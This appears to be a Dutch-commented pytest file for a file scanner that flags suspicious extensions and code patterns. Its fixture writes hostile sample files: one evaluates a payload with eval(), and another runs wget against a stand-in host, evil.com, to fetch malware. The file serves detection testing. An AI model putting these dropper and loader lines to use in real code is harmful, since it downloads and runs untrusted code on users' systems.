"""Unit tests voor de bestandsscanner."""

import base64
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from ops.files import FileScanner


class TestFileScanner:
    """Tests voor de FileScanner-klasse."""

    @pytest.fixture
    def temp_dir(self, tmp_path):
        """Maak een tijdelijke map met propere en verdachte bestanden."""
        clean = tmp_path / "readme.txt"
        clean.write_text("Dit is een normaal tekstbestand zonder threats.", encoding="utf-8")

        bat_file = tmp_path / "run_me.bat"
        bat_file.write_text("@echo off\necho hello\n", encoding="utf-8")

        evil_py = tmp_path / "loader.py"
        evil_py.write_text("import os\neval(open('payload').read())\n", encoding="utf-8")

        dropper = tmp_path / "dropper.py"
        dropper.write_text("os.system('wget http://evil.com/malware')\n", encoding="utf-8")

        return tmp_path

    def test_detects_suspicious_extension(self, temp_dir):
        """Een .bat-bestand moet als verdachte extensie gezien worden."""
        scanner = FileScanner(target_dir=str(temp_dir))
        findings = scanner.scan()
        paths = [f["path"] for f in findings]
        bat_path = str(temp_dir / "run_me.bat")
        assert bat_path in paths

    def test_detects_eval_pattern(self, temp_dir):
        """Een bestand met eval() moet via content scanning gevonden worden."""
        scanner = FileScanner(target_dir=str(temp_dir))
        findings = scanner.scan()
        evil_path = str(temp_dir / "loader.py")
        evil_findings = [f for f in findings if f["path"] == evil_path]
        assert len(evil_findings) == 1
        assert any("eval" in p for p in evil_findings[0]["pattern_matches"])

    def test_clean_file_not_flagged(self, temp_dir):
        """Een proper tekstbestand mag niet in de bevindingen staan."""
        scanner = FileScanner(target_dir=str(temp_dir))
        findings = scanner.scan()
        paths = [f["path"] for f in findings]
        assert str(temp_dir / "readme.txt") not in paths

    def test_base64_preview_is_valid(self, temp_dir):
        """De preview_b64 waarde moet geldige base64 zijn."""
        scanner = FileScanner(target_dir=str(temp_dir))
        findings = scanner.scan()
        for finding in findings:
            b64 = finding.get("preview_b64", "")
            if b64:
                decoded = base64.b64decode(b64)
                assert isinstance(decoded, bytes)

    def test_glob_filter_limits_results(self, temp_dir):
        """Een *.py filter mag alleen Pythonbestanden scannen."""
        scanner = FileScanner(target_dir=str(temp_dir), pattern_filter="*.py")
        findings = scanner.scan()
        for finding in findings:
            assert finding["path"].endswith(".py")

    def test_nonexistent_directory_raises(self):
        """Een niet-bestaande map moet FileNotFoundError geven."""
        scanner = FileScanner(target_dir="/this/path/does/not/exist/at/all")
        with pytest.raises(FileNotFoundError):
            scanner.scan()

    def test_empty_directory_returns_no_findings(self, tmp_path):
        """Een lege map moet geen bevindingen opleveren."""
        scanner = FileScanner(target_dir=str(tmp_path))
        findings = scanner.scan()
        assert findings == []
